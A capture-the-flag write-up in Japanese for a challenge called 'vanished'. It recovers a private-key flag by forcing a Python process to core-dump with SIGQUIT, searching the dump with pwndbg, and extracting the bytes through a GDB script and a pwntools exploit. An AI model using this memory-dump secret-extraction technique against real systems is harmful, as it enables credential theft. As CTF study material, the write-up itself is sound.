---
title: vanished Writeup
---

permission denied 3のようにファイルを残す方針は厳しそうである。  
よく考えるとメモリにフラグが残っているので、それを取得する方針を検討していった。

まずは、 `/proc/{pid}/mem` から取得を試みたが、yama patchが適用されているため上手く動かなかった。
次に、SIGQUITでPythonをQuitさせてコアダンプを作ることを試みた。system("sh")が実行されている状態では上手く動かなかったが、input()で停止している時にQUITシグナルを送ることでcoreダンプを出力させることが出来た。

次にcoredumpからprivate_keyの内容を得る方法を模索した。
スタックの構造が大体同じになっていると仮定して、ローカルで得たcore dumpから、どのようにメモリを辿ればいいかを得る。

素のgdbだとメモリ全体からの直接的な検索ができないのでpwngdbは便利。

```
pwndbg> search REDACTED
Searching for byte: b'REDACTED'
[load7]         0x78e4424c9ea0 'REDACTEDREDACTEDREDACTEDREDACTED'
```

bytes型は32byte手前にヘッダを持つので

```
pwndbg> search -t qword 0x78e4424c9e80
Searching for an 8-byte integer: b'\x80\x9eLB\xe4x\x00\x00'
[load7]         0x78e442526698 0x78e4424c9e80
⚠️ warning: Unable to access 16007 bytes of target memory at 0x78e44273a000, halting search.
⚠️ warning: Unable to access 16007 bytes of target memory at 0x78e44282a000, halting search.
⚠️ warning: Unable to access 16007 bytes of target memory at 0x78e442a20000, halting search.
[stack]         0x7ffcf7c725c8 0x78e4424c9e80
[stack]         0x7ffcf7c72658 0x78e4424c9e80
[stack]         0x7ffcf7c72660 0x78e4424c9e80

pwndbg> print $rsp - 0x7ffcf7c72660
$2 = (void *) 0x980
```

再現性がありそうなのでGDBスクリプトを作成

```
python
addr = int(gdb.parse_and_eval("*(long*)($rsp - 0x980) + 32"))
data = gdb.selected_inferior().read_memory(addr, 32).tobytes()
open("flag.txt", "w").write("Alpaca{"+data.hex()+"}")
```

ローカル(WSL2)ではcoreファイルが`core.pid`だったが、リモートでは`core`だったので補正してフラグをゲットした。

```python
import base64
import gzip
import subprocess

from pwn import *

host = args.HOST
port = int(args.PORT)

r1 = remote(host, port)
sleep(5)
r2 = remote(host, port)

r2.sendlineafter(b"are you sure you want to delete everything? (y/N): ", b"y")
# r1の接続をcore dumpさせる
r2.sendlineafter(b"# ", b"kill -QUIT 8")
r2.sendlineafter(b"# ", b"cat core | gzip | base64")
core_base64 = r2.recvuntil(b"# ")

core_dump = base64.b64decode(core_base64[0:-2].decode())
with open("core", "wb") as f:
    f.write(gzip.decompress(core_dump))

subprocess.run(["gdb", "-q", "--batch", "-c", "core", "--command", "debug.txt"])
print(open("flag.txt", "r").read())

```
